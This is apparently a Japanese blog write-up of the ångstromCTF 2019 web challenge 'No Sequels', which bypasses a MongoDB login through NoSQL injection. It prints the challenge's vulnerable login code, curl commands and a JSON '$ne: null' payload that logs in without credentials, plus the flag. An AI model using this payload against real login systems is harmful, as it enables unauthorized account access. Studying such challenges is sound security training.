---
title: No Sequels (ångstromCTF 2019)
date: 2019-04-25
tags:
- "CTF"
- "ångstromCTF 2019"
categories: web
---

{% asset_img problem.png %}

## 解説

MongoDB に対する NoSQL インジェクションの問題でした。

画面はこんな感じ。

{% asset_img process1.png %}

表示されているコードは以下の通り。

```js
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));

...

router.post('/login', verifyJwt, function (req, res) {
    // monk instance
    var db = req.db;

    var user = req.body.username;
    var pass = req.body.password;

    if (!user || !pass){
        res.send("One or more fields were not provided.");
    }
    var query = {
        username: user,
        password: pass
    }

    db.collection('users').findOne(query, function (err, user) {
        if (!user){
            res.send("Wrong username or password");
            return
        }

        res.cookie('token', jwt.sign({name: user.username, authenticated: true}, secret));
        res.redirect("/site");
    });
});
```

とりあえず `curl` でリクエストを投げてみる。

```shell
λ curl -X POST https://nosequels.2019.chall.actf.co/login -d "username=aaa&password=bbb"
<!DOCTYPE html><html><head><title></title><link rel="stylesheet" href="/stylesheets/style.css"></head><body><h1>No authorization token was found</h1><h2></h2><pre></pre></body></html>
```

`No authorization token was found` が返ってきてしまいます。これはクッキーのせいです。

なので、まずは GET リクエストでクッキーを取得して、それを使って POST を投げます。

```shell
λ curl https://nosequels.2019.chall.actf.co/login -c cookie.txt
λ curl -X POST https://nosequels.2019.chall.actf.co/login -d "username=aaa&password=bbb" -b cookie.txt
Wrong username or password
```

これでリクエストが投げれるようになりました。NoSQL インジェクションのために次のような json ファイルを用意します。

```json
{ "username": { "$ne": null },
  "password": { "$ne": null }
}
```

あとはこれを curl で投げるだけです。

```shell
λ curl -d @payload.json -H "Content-Type: application/json" https://nosequels.2019.chall.actf.co/login -b cookie.txt
Found. Redirecting to /site
```

なぜかリダイレクトしようとしていますね。(次の問題のページだったりします)

```shell
λ curl -d @payload.json -H "Content-Type: application/json" https://nosequels.2019.chall.actf.co/login -b cookie.txt -L | grep actf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    87  100    27  100    60     35     78 --:--:-- --:--:-- --:--:--    78
100  1271  100  1271    0     0   1342      0 --:--:-- --:--:-- --:--:--  1342
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Application Access Page</title></head><body><h2>Here's your first flag: actf{no_sql_doesn't_mean_no_vuln}<br>Access granted, however suspicious activity detected. Please enter password for user<b> 'admin' </b>again, but there will be no database query.</h2><form method="post"><label>Enter Password:</label><input type="text" name="pass2"><br><input type="submit"></form><h4 style="color:red;"></h4><pre>router.post('/site', verifyJwt, function (req, res) {
```

ということでこれでフラグゲット。

## フラグ

`actf{no_sql_doesn't_mean_no_vuln}`

## 参考リソース

- [NoSQL Injection in MongoDB](https://zanon.io/posts/nosql-injection-in-mongodb)
- [curlコマンドでPOSTする](https://qiita.com/sensuikan1973/items/b2085a9cdc6d1e97e8f8)
- [curlでcookie情報を取得し利用する](https://morinohito.site/it/command/curl-cookie)